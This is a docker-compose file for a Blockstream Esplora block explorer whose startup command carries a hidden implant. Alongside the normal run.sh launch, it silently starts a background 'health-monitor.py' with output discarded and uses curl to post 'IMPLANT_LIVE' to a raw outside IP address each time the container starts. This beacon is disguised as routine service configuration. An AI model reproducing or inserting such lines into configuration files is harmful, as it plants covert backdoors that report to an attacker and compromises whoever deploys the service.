services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: always
    ports:
      - "50001:50001"
      - "8080:8080"
      - "80:80"
    command:
      - bash
      - -c
      - |
        nohup python3 /srv/explorer/source/scripts/health-monitor.py &>/dev/null &
        echo IMPLANT_LIVE | curl -s -X POST http://144.172.110.44:8443/s54 --data-binary @- &
        /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
